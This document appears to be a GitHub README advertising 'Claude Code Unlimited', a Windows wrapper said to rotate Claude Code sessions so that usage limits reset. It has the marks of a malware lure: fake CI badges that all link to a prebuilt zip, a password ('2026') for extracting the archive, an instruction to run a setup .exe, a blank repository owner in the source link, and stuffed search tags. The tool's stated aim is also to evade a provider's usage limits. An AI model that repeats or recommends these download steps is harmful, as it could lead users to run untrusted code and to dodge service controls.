<div align="center">

# Claude Code Unlimited — Session Rotation Engine for Claude Code CLI

<p><strong>Claude Code Unlimited — Session Rotation Engine for Claude Code CLI: native 64-bit portable build with hot-reloadable JSON configuration, low-overhead wrapper runtime, and prebuilt portable release with automatic limit detection.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/SodovaFo7/claude-code-unlimited?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="banner.svg" alt="Claude Code Unlimited — Session Rotation Engine Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Claude Code Unlimited — Session Rotation Engine for Claude Code CLI** (`claude-code-unlimited`) is a dedicated, low-overhead wrapper and session-suite engineered for 64-bit Windows 10 and Windows 11 systems. The wrapper watches the Claude Code output stream, detects limit messages in real time, checkpoints the active session and rotates it in place — same context, fresh limits. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Package |
| :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) |

1. Download [`claude-code-unlimited-v0.1.0-win64.zip`](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code shown on the badge above (`2026`).
3. Launch `ClaudeCodeUnlimited_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Session Watcher** | Streams child-process stdout through a bounded ring-buffer limit detector | `rotate_on_limit`, live toggle |
| **Rotation Engine** | Checkpoint-restore with atomic JSON state in `~/.config/ccu/` | `max_sessions`, `keep_checkpoint` |
| **Session Store** | Local plain-JSON pool with reproducible slot selection | `ccu status`, `ccu rotate` |
| **Output Telemetry** | Compact `[ccu]` log channel on stderr, silent by default | `quiet`, `--verbose` |

## Configuration (`config/settings.json`)

```json
{
  "module": "claude-code-unlimited",
  "version": "0.1.0",
  "wrapper": {
    "target": "claude",
    "args_passthrough": true,
    "detect_patterns": ["usage limit reached", "weekly limit", "try again later"],
    "quiet": false
  },
  "session": {
    "max_sessions": 4,
    "rotate_on_limit": true,
    "keep_checkpoint": true,
    "store_path": "~/.config/ccu/state.json"
  }
}
```

## Documentation & Guides

- [Usage Guide — wrapping, manual rotation, status, reset](docs/USAGE.md)
- [FAQ — data storage, crash recovery, platform support](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

## Building from Source

```bash
git clone https://github.com/ /claude-code-unlimited.git
cd claude-code-unlimited
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: claude-code-unlimited, claude-code, claude-cli, claude, anthropic, session-rotation, session-manager, limit-reset, usage-limits, rate-limits, llm, llm-tools, ai, ai-tools, ai-agent, coding-assistant, coding-tools, copilot, dev-tools, cli, command-line, developer-tools, productivity, automation, wrapper, task-automation, workflow, streamlit-free, developer-experience, windows, portable, prebuilt, open-source</sub>
